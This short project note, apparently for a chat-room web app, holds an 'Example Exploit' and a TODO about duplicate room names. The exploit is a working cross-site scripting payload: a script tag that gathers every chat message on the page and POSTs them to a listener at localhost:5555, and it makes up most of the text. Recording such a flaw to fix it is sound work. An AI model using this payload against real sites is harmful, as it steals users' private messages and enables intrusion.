Example Exploit:
====================
    <script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:5555/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>
TODO:
====================
Change behavior when creating new room with existing name from joining existing room, maybe by hashing user creating and roomname together to allow multiple users to have same room names